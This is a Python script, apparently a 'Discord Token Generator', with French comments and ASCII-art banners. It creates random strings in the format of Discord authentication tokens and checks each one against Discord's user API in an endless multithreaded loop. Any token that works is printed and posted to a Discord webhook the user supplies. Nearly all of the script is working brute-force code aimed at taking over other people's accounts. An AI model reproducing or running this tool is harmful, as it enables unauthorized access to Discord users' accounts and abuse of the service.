import string
import requests
import json
import random
import threading
import time
import os

    # 1. Le logo en texte ASCII généré (exemple)
logo_ascii = """
                                              @@@@                @%@@                                      
                                       @@@@@@@@@@@@               @@@@@@@@@@%                               
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                         
                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                       
                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                    
                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                   
                          %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%                  
                          %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@                  
                          %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%                  
                         %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%                 
                         %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                           @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@                   
                              @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@                      
                                   @%@@@@@@@                            @@@@@@%%@                           
                                         @@                              @@             

"""

# 2. Nettoyer l'écran avant l'affichage (optionnel, mais propre)
# 'cls' pour Windows, 'clear' pour Linux/macOS
os.system('cls' if os.name == 'nt' else 'clear')

# 3. Afficher le logo
print(logo_ascii)

# 4. Ajouter une petite pause avant le reste du script (optionnel)
time.sleep(2)

# Placeholder functions and variables for undefined references
def Title(text):
    print(f"=== {text} ===")

def ErrorModule(e):
    print(f"Error: {e}")

def current_time_hour():
    return time.strftime("%H:%M:%S")

def CheckWebhook(url):
    # Basic validation for webhook URL
    if url.startswith("https://") and "discord.com/api/webhooks" in url:
        print("Webhook URL looks valid.")
    else:
        print("Invalid webhook URL.")

def ErrorNumber():
    print("Error: Invalid number entered.")

def Error(e):
    print(f"An error occurred: {e}")

def Slow(text):
    print(text)

# Some color codes for console output
class color:
    GREEN = '\033[92m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    END = '\033[0m'

# Some placeholders for variables
BEFORE = ""
AFTER = ""
reset = ""
INPUT = ""
BEFORE_GREEN = ""
AFTER_GREEN = ""
GEN_VALID = "[V]"
GEN_INVALID = "[X]"
color_webhook = 3447003  # Discord's blurple color
username_webhook = "TokenChecker"
avatar_webhook = ""  # URL to avatar image

# Banner or some ASCII art
discord_banner = """
   ____  _                 _   ____        _                 
  |  _ \| | __ _ ___ ___| |_/ ___| _   _| | ___   ___  ___ 
  | | | | |/ _` / __/ __| __\___ \| | | | |/ _ \ / _ \/ __|
  | |_| | | (_| \__ \__ \ |  |__) | |_| | | (_) |  __/\__ \\
  |____/|_|\__,_|___/___/_|_|____/ \__,_|_|\___/ \___||___/
"""

# Main script starts here
try:
    Title("Discord Token Generator")
    Slow(discord_banner)
    
    # Ask user about webhook
    webhook_response = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook? (y/n) -> {reset}")
    
    if webhook_response.lower() in ['y', 'yes']:
        webhook_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook URL -> {reset}")
        CheckWebhook(webhook_url)
        
        try:
            threads_number = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Threads Number -> {reset}"))
        except:
            ErrorNumber()
            threads_number = 1  # Default fallback

        # Function to send webhook
        def send_webhook(embed_content):
            payload = {
                'embeds': [embed_content],
                'username': username_webhook,
                'avatar_url': avatar_webhook
            }
            headers = {'Content-Type': 'application/json'}
            try:
                requests.post(webhook_url, data=json.dumps(payload), headers=headers)
            except Exception as e:
                ErrorModule(e)

        # Function to generate and check token
        def token_check():
            first_part = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(random.choice([24, 26])))
            second_part = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(random.choice([6])))
            third_part = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(random.choice([38])))
            token = f"{first_part}.{second_part}.{third_part}"
            try:
                response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token})
                user = response.json()
                if 'username' in user:
                    # Token is valid
                    if webhook_response.lower() in ['y', 'yes']:
                        embed_content = {
                            'title': 'Token Valid!',
                            'description': f"**Token:**\n{token}",
                            'color': color_webhook,
                            'footer': {
                                'text': username_webhook,
                                'icon_url': avatar_webhook,
                            }
                        }
                        send_webhook(embed_content)
                    print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Status: {color.WHITE}Valid{color.GREEN} Token: {color.WHITE}{token}{color.END}")
                else:
                    print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {color.WHITE}Invalid{color.RED} Token: {color.WHITE}{token}{color.END}")
            except:
                print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {color.WHITE}Error{color.RED} Token: {color.WHITE}{token}{color.END}")

        # Function to run multiple threads
        def request():
            threads = []
            try:
                for _ in range(threads_number):
                    t = threading.Thread(target=token_check)
                    t.start()
                    threads.append(t)
            except:
                ErrorNumber()
            for t in threads:
                t.join()

        # Infinite loop
        while True:
            request()

except Exception as e:
    Error(e)